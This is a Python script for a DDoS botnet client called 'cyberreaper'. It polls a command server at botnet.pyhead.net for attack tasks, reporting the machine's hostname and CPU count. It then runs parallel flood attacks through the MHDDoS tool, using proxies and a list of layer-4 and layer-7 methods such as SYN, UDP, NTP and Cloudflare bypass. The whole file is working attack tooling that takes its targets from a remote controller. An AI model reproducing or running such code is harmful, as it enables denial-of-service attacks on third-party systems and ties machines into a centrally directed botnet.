#!/usr/bin/env python3
import argparse
import json
import psutil
import subprocess
import sys

from collections import namedtuple
from logging import basicConfig, getLogger
from proxies import update_file
from queue import Queue
from socket import gethostname
from sys import argv
from threading import Thread
from time import sleep
from urllib.request import urlopen


basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")

getLogger('proxies').setLevel("CRITICAL")
logger = getLogger("Bot Runner")
logger.setLevel("INFO")

url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"

loop_time = 60
RETRY_PERIOD_SEC = 30


class Worker(Thread):
    """Thread executing tasks from a given tasks queue"""

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            finally:
                self.tasks.task_done()


class ThreadPool:
    """Pool of threads consuming tasks from a queue"""

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """Add a task to the queue"""
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        """Wait for completion of all the tasks in the queue"""
        self.tasks.join()


l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
      "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
      "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE"]


def customDecoder(Obj):
    return namedtuple('X', Obj.keys())(*Obj.values())


def runner(config, cpu_limit, threads_limit=0):
    if int(config.Duration) > loop_time:
        period = loop_time
    else:
        period = config.Duration
    cfg_threads = config.Threads if threads_limit <= 0 else threads_limit
    if config.UseProxy:
        if config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.ProxyType),
                str(cfg_threads),
                str(config.ProxyList),
                str(config.RPC),
                str(period)
            ]
        else:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(cfg_threads),
                str(period),
                str(config.ProxyType),
                str(config.ProxyList)
            ]
    else:
        if not config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(cfg_threads),
                str(period)
            ]
        else:
            logger.info(
                'No we cant run the LEVEL7 attacks without proxy. Skipping')
            return
    try:
        cpu_usage = psutil.cpu_percent(4)
        while cpu_usage > cpu_limit:
            logger.info(f"The CPU load {cpu_usage} is too high. Thread waiting...")
            sleep(loop_time)
            cpu_usage = psutil.cpu_percent(4)
        subprocess.run([sys.executable, "MHDDoS/start.py", *params])
        logger.info("The system works good! Thanks :P ")
    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.info(f"OOPS... {config.Dst} -> Issue: {error}")


if __name__ == '__main__':

    logger.info('''
  ____      _               ____                         _   _   _   _    
 / ___|   _| |__   ___ _ __/ ___| _ __   __ _  ___ ___  | | | | | | / \   
| |  | | | | '_ \ / _ \ '__\___ \| '_ \ / _` |/ __/ _ \ | | | | | |/ _ \  
| |__| |_| | |_) |  __/ |   ___) | |_) | (_| | (_|  __/ | | | |_| / ___ \ 
 \____\__, |_.__/ \___|_|  |____/| .__/ \__,_|\___\___| | |  \___/_/   \_\ 
      |___/                      |_|                    |_|               
''')
    parser = argparse.ArgumentParser(prog="cyberreaper")
    parser.add_argument("-a", "--max-attacks",
                        action="store",
                        required=False,
                        type=int,
                        default=psutil.cpu_count() // 2,
                        help="Maximum amount of the attacks executed in parallel (attack pool size).")
    parser.add_argument("-t", "--attack-threads-limit",
                        action="store",
                        required=False,
                        type=int,
                        default=0,
                        help="Limit amount of the threads for every attack. If value >0, it overrules the "
                             "attack's task configuration 'Threads' parameter provided that has higher "
                             "value compared to this option's value.")
    parser.add_argument("-c", "--cpu-limit",
                        action="store",
                        required=False,
                        type=int,
                        default=70,
                        help="Limit the CPU usage by attacks to the specified value.")

    args = parser.parse_args()
    pool_size = args.max_attacks
    max_threads = args.attack_threads_limit
    cpu_limit = args.cpu_limit

    logger.info(f"Fetch tasks URL: {url}")

    try:
        pool = ThreadPool(pool_size)

        logger.info("Get fresh proxies. Please wait...")
        update_file()

        while True:
            logger.info("Getting fresh tasks from the server!")
            try:
                for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
                    pool.add_task(runner, conf, cpu_limit, threads_limit=max_threads)
                    sleep(loop_time / 4)
                pool.wait_completion()

            except Exception as error:
                logger.critical(f"OOPS... We faced an issue: {error}")
                logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                sleep(RETRY_PERIOD_SEC)

    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.critical(f"OOPS... We faced an issue: {error}")
        logger.info("Please restart the tool! Thanks")

